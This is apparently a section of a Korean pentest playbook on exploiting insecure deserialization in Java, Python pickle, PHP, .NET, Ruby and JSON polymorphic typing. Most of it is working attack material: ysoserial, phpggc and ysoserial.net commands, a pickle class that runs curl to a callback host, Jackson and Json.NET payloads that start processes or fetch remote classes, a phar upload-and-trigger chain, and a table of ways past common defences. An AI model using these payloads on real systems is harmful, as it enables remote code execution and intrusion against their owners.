### Phase 2: 동적 테스트 (검증)

**정찰 페이로드:**

**직렬화 sink 탐지 (요청/응답에서 시그니처):**

| 언어 | 시그니처 (Base64 / Hex) | 발견 위치 |
|---|---|---|
| Java | `rO0AB` / `ac ed 00 05` | Cookie, Body, ViewState |
| Python pickle | `gASV` / `\x80\x04\x95` | Body, Redis 세션 |
| PHP | `a:2:{s:`, `O:4:"User"` | Cookie, 세션 파일 |
| .NET | `AAEAAAD`, `__VIEWSTATE` | Cookie, form hidden |
| Ruby Marshal | `\x04\x08` | Cookie, 세션 |
| Java RMI | `JRMI` (port 1099 일반) | TCP raw |
| .NET BinaryFormatter | `0001000000ffffffff` | Body |

```bash
# 응답/요청에서 시그니처 grep
curl -v "https://target/api/endpoint" 2>&1 | grep -iE "rO0AB|gASV|AAEAAAD|x-java-serialized|application/x-java-serialized-object"
```

---

**기본 페이로드:**

**Java (ysoserial):**
```bash
# DNS callback (URLDNS chain — 의존성 불필요)
java -jar ysoserial.jar URLDNS "https://CALLBACK.oast.fun/deser-java" | base64 -w0

# Time-based (Commons Collections — classpath 확인 후)
java -jar ysoserial.jar CommonsCollections1 "sleep 5" | base64 -w0

# OOB curl callback
java -jar ysoserial.jar CommonsCollections1 "curl https://CALLBACK/cc1" | base64 -w0

# 다양한 gadget 시도
java -jar ysoserial.jar CommonsCollections{2..7} "..." | base64 -w0
java -jar ysoserial.jar Hibernate{1,2} "..." | base64 -w0
java -jar ysoserial.jar Spring{1,2} "..." | base64 -w0
java -jar ysoserial.jar JRMPClient "..." | base64 -w0  # JRMP for OOB
```

```bash
# 전송 (Content-Type 다양 시도)
curl -X POST "https://target/api/endpoint" \
  -H "Content-Type: application/x-java-serialized-object" \
  -H "Cookie: session=SESSION" --data-binary @payload.ser

curl -X POST "https://target/api/endpoint" \
  -H "Content-Type: application/octet-stream" --data-binary @payload.ser
```

**Python pickle:**
```python
import pickle, base64
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('curl https://CALLBACK.oast.fun/pickle',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())

# Time-based 변형
class TimeBomb:
    def __reduce__(self):
        import time
        return (time.sleep, (5,))
```

**PHP unserialize:**
```php
// 속성 변조 (단순 인증 우회)
O:4:"User":2:{s:4:"name";s:4:"a";s:8:"is_admin";b:1;}

// POP chain (phpggc)
phpggc Monolog/RCE1 system "curl CALLBACK" -b
phpggc Symfony/RCE1 system "id" -b
phpggc Laravel/RCE6 system "id" -b
phpggc -l  # 사용 가능 chain 목록
```

**.NET ViewState:**
```bash
# ysoserial.net (MAC 비활성 또는 machineKey 노출 시)
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter \
  -c "cmd /c curl CALLBACK" -o base64

curl -X POST "https://target/page.aspx" \
  -d "__VIEWSTATE=<BASE64>&__VIEWSTATEGENERATOR=..."

# AspNetCore Data Protection 키 노출 시
ysoserial.exe -g WindowsIdentity -f Json.Net \
  -c "cmd /c calc" -o base64
```

**Ruby Marshal:**
```ruby
# universal_rce gadget (Rails secret_key_base 노출 시)
# 별도 도구 (rapid7/metasploit 모듈) 활용
```

**Jackson/Json.NET polymorphic** (`POLYMORPHIC` 라벨):
```json
# Jackson default typing
["org.springframework.context.support.ClassPathXmlApplicationContext","http://CALLBACK/evil.xml"]

# Jackson Spring4Shell 변형
["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://CALLBACK/x","autoCommit":true}]

# Json.NET TypeNameHandling.All
{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c calc"}}
```

**phar:// 간접 역직렬화 (PHP):**
```bash
# 1. malicious.phar 생성 (PHP gadget chain 포함)
# 2. 업로드
curl -X POST "https://target/upload" -F "file=@malicious.phar"
# 3. file_exists/stat 호출 트리거
curl "https://target/check?file=phar://uploaded.phar/x.txt"
```

---

**우회 페이로드:**

| 방어 | 우회 |
|---|---|
| 타입 화이트리스트 root type | nested gadget chain — `HashMap$Entry` 같은 내부 클래스 |
| Java JEP 290 `ObjectInputFilter` 광범위 (`*`, `java.util.*`) | Commons Collections nested 클래스 |
| PHP `__wakeup` 차단 | `__destruct`/`__toString`/`__call` 매직 메서드로 POP chain |
| HMAC 서명 + 키 하드코딩 | 키 노출 시 서명 — ENV/KMS 필수 |
| 추상 클래스 allowlist | concrete subclass로 우회 |
| Jackson `LaissezFaireSubTypeValidator` (2.10+) | 사실상 무필터 — `BasicPolymorphicTypeValidator` + `allowIfBaseType` 필요 |

**인코딩 우회:**
```bash
# Gzip 압축 후 Base64
gzip -c payload.ser | base64 -w0

# Hex 인코딩
xxd -p payload.ser | tr -d '\n'
```

---

**참고사항:**

- classpath/의존성에서 gadget chain 라이브러리(Commons Collections, BeanUtils, Spring) 확인이 실전 성공률 결정
- URLDNS는 가장 신뢰성 높은 blind 탐지 (의존성 불필요 — Java 7+ 표준 JDK)
- `phar://` 간접 역직렬화는 PHP에서 `file_exists`/`stat` 만으로도 트리거 (파일 업로드 결합)
- Ruby `secret_key_base` 노출 시 cookie session-store를 통한 universal gadget
- .NET BinaryFormatter는 deprecated이나 WCF/Remoting/ViewState 잔존 사례 다수
- JWT 페이로드가 base64 디코딩 후 unserialize되는 경로도 deserialization 변형 (jwt-scanner 결합)
- polymorphic typing (Jackson/Json.NET)은 JSON으로 보여도 RCE 게이트
- Apache Commons Configuration2 `Lookups`는 Log4Shell 변형 JNDI 공격 면
- Redis/Memcached에서 읽은 직렬화 값에 사용자 입력 반영 경로 2차 deser
- ysoserial 다양한 gadget — classpath별 다른 결과 (CC1~7, Hibernate, Spring, Groovy, ...)
- ysoserial.net Windows 환경 ViewState/JSON.NET RCE
- phpggc는 PHP framework별 chain 자동 생성 — Symfony/Laravel/Drupal/WordPress 지원
- `application/x-java-serialized-object` Content-Type이 명시되면 직렬화 sink 거의 확정
- Spring 메시지 컨버터 (HTTP invoker, RMI)는 자동 unserialize — 사용자 입력 도달 시 위험
- PostgreSQL pl/python, MSSQL CLR enable 같은 DB 환경도 deserialization 변형 (DB sink)
